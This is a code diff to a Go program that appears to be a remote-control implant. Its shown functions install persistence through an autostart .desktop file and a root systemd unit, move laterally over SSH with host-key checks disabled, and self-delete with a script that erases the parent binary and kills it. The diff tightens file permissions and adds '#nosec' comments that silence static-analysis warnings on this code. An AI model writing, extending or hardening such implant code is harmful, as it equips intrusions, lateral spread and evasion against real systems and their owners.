@@ -188,7 +188,7 @@ NoDisplay=false
 X-GNOME-Autostart-enabled=true
 `, sanitizeLabel(persistencePrefix), absExe)
 			desktopPath := filepath.Join(autostartDir, sanitizeLabel(persistencePrefix)+".desktop")
-			if err := os.WriteFile(desktopPath, []byte(desktop), 0644); err != nil {
+			if err := os.WriteFile(desktopPath, []byte(desktop), 0600); err != nil {
 				errs = append(errs, fmt.Sprintf("write desktop file failed: %v", err))
 			}
 		}
@@ -1055,7 +1055,8 @@ func lateralSSH(target, user, pass, cmd string) (string, error) {
 	config := &ssh.ClientConfig{
 		User:            user,
 		Auth:            authMethods,
-		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+		// #nosec G106 -- the agent has no known_hosts store; lateral targets are operator-specified.
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // #nosec G106
 		Timeout:         10 * time.Second,
 	}
 
@@ -1563,7 +1564,7 @@ RestartSec=10
  WantedBy=multi-user.target
  `, persistencePrefix, absExe)
 		servicePath := fmt.Sprintf("/etc/systemd/system/%s.service", serviceName)
-		if err := os.WriteFile(servicePath, []byte(serviceUnit), 0644); err != nil {
+		if err := os.WriteFile(servicePath, []byte(serviceUnit), 0600); err != nil {
 			return fmt.Sprintf("persistence: failed to write systemd unit: %v", err)
 		}
 		if out, err := exec.Command("systemctl", "daemon-reload").CombinedOutput(); err != nil {
@@ -1895,7 +1896,8 @@ func protectProcess() string {
 func selfDelete() string {
 	script := "#!/bin/sh\nrm -f /proc/$PPID/exe 2>/dev/null\nkill -9 $PPID 2>/dev/null\nrm -f \"$0\""
 	tmpFile := "/tmp/.fc_cleanup.sh"
-	if err := os.WriteFile(tmpFile, []byte(script), 0755); err != nil {
+	// #nosec G306 -- self-delete must execute the script it writes.
+	if err := os.WriteFile(tmpFile, []byte(script), 0755); err != nil { // #nosec G306
 		return "self-delete: failed to write script: " + err.Error()
 	}
 	if err := exec.Command("/bin/sh", tmpFile).Start(); err != nil {
@@ -1983,7 +1985,8 @@ func selfUpdateLinux(exe, tmpPath string) string {
 		"#!/bin/sh\nsleep 1\ncp -f '%s' '%s'\nchmod +x '%s'\nexec '%s'\n",
 		tmpPath, exe, exe, exe)
 	tmpScript := exe + ".update.sh"
-	if err := os.WriteFile(tmpScript, []byte(shScript), 0755); err != nil {
+	// #nosec G306 -- the update helper must execute the script it writes.
+	if err := os.WriteFile(tmpScript, []byte(shScript), 0755); err != nil { // #nosec G306
 		return "failed to write update script: " + err.Error()
 	}
 
